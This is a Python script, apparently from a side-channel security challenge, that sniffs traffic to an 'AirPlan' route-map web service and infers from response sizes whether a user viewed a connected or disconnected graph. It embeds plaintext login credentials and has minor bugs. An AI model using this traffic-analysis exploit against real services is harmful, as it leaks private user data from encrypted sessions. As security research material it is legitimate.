from __future__ import division
import processpackets
import packetcollector
import airplan_client
from airplan_client import AirPlanClient
import argparse
import json
import time
import numpy

class ConnectedAttack(object):

    ALLOWED_VARIATION = 64

    def __init__(self, ip, port, interface):
        self.ip = ip
        self.port = port
        self.interface = interface

    # determine whether a connected or disconnected graph had its properties viewed
    def find(self, db, pcapfile):
        with open(db, 'r') as infile:
            sizes = json.load(infile)
            self.CONNECTED_GRAPH_PROPERTIES_SIZE = int(sizes["connected"])
            self.DISCONNECTED_GRAPH_PROPERTIES_SIZE = int(sizes["disconnected"])
            self.SELECTOR_URL_SIZE = int(sizes["URL_size"])
            self.SELECTOR_SIZE = int(sizes["selector_size"])


        if not self.is_attack_viable():
            print "Unable to distinguish between connected and disconnected graph properties."
            return

        packets = processpackets.read_pcap(pcapfile)
        transactions = processpackets.get_transactions(packets, self.ip, int(self.port))
        # look at 3 consecutive transactions for upload, weight selection, then properties
        for i in range(len(transactions)-2):
            pot_upload = transactions[i]
            pot_selector = transactions[i+1]
            pot_properties = transactions[i+2]

            resp_size = pot_properties.resp.get_size()

            if abs(pot_upload.resp.get_size() - self.SELECTOR_URL_SIZE) > self.ALLOWED_VARIATION:
                continue # first transaction doesn't look like an upload
            if abs(pot_selector.resp.get_size() - self.SELECTOR_SIZE) > self.ALLOWED_VARIATION:
                continue # second transaction doesn't look like the weight selector for properties viewing
            if abs(resp_size - self.CONNECTED_GRAPH_PROPERTIES_SIZE) < self.ALLOWED_VARIATION:
                print "Connected graph had properties displayed"
            elif abs(resp_size - self.DISCONNECTED_GRAPH_PROPERTIES_SIZE) < self.ALLOWED_VARIATION:
                print "Disconnected graph had properties displayed"

    def is_attack_viable(self):
        data, url_sizes, selector_sizes = self.gather_size_data()
        dis_sizes = data["disconnected"]
        con_sizes = data["connected"]
        for dis_size in dis_sizes:
            for con_size in con_sizes:
                if con_size >= dis_size:
                    return False
        return True #Note: this doesn't necessarily mean that the attack is viable, just that we didn't prove its inviability with these examples

    def gather_size_data(self):
        maps = {"connected": ["connected_map.txt", "connected_map2.txt"], "disconnected":["disconnected_map.txt", "disconnected_map2.txt"] }
        property_sizes = {"connected":set(), "disconnected":set()}
        selector_sizes = []
        selector_URL_sizes = []
        for type in maps:
            for routemap in maps[type]:
                for cost in ["Cost", "Passengers"]:
                    for (username, password) in [("uk", "aSdf8972342A"), ("test", "test")]:
                        airplan = AirPlanClient(self.ip, self.port, username, password)
                        with airplan_client.get_session() as session:
                            login = airplan.login(session)
                            data = self.observe_packet_data(airplan, session, routemap, username + cost + routemap, cost)
                            property_sizes[type].add(data["resp_size"])
                            selector_sizes.append(data["selector_size"])
                            selector_URL_sizes.append(data["URL_size"])
        return property_sizes, selector_URL_sizes, selector_sizes

    #  analysis to allow us to determine the correspondence between map connectivity and packet size
    # this should be run when/if attack needs to be updated
    # returns false if attack is not feasible
    def build(self, db):
        sizes, URL_sizes, selector_sizes, = self.gather_size_data()

        clean_sizes = {}
        for type in sizes:
            if len(sizes[type])!=1: # we expect exactly one size for each type
                print "Attack not feasible.  Size discrepancy in type " + type
                return None
            else:
                clean_sizes[type] = sizes[type].pop()
                clean_sizes["URL_size"] = numpy.mean(URL_sizes)
                clean_sizes["selector_size"] = numpy.mean(selector_sizes)
        print "saving sizes to file " + db
        with open(db, 'w') as outfile:
            json.dump(clean_sizes, outfile)
        return clean_sizes


    #upload the requested map, view its properties, and collect data
    def observe_packet_data(self, airplan, session, map, name, cost):
        with packetcollector.PacketCollector(self.interface, "tcp port {}".format(self.port)) as packet_collector:
            airplan.uploadRouteMap(session, map, name)
            airplan.properties(session, cost) # which weight is used doesn't matter
            # give it time for the packets to be collected
            time.sleep(2)
            packet_collector.stop()
            pcap = packet_collector.get_pcap()
            transactions = processpackets.get_transactions(pcap, self.ip, int(self.port))
            if len(transactions)!=3:
                 "skipping " + map + " due to missing packet"
                 return -1
            else:
                data = {}
                data["resp_size"] = transactions[2].resp.get_size() # size the properties view response
                data["URL_size"] = transactions[0].resp.get_size() # size of the URL for graph property selector
                data["selector_size"] = transactions[1].resp.get_size() # size of the graph property selector page
                return data

    def compute_duration_threshold(self, durations):
        mean = numpy.mean(durations)
        std = numpy.std(durations)
        return mean + 2*std

if __name__=="__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("serverip", help="the server ip address")
    parser.add_argument("serverport", help="the server port")
    parser.add_argument("interface", help="the interface to use when building the database (required when building)")
    parser.add_argument("db", help="file in which size information for connected/disconnected maps is stored")

    subparsers = parser.add_subparsers(dest="command")
    buildparser = subparsers.add_parser('build', help='Build a new database of sizes for conneicted')
    findparser = subparsers.add_parser('attack', help='determine the sizes of the maps uploaded during a session')
    findparser.add_argument("pcap", help="pcap of a session")

    args = parser.parse_args()
    attack = ConnectedAttack(args.serverip, args.serverport, args.interface)
    if args.command == 'build':
        attack.build(args.db)
    elif args.command == 'attack':
        attack.find(args.db, args.pcap)
